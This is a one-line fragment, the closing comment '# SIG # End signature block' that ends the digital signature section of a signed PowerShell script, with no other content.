 # SIG # End signature block
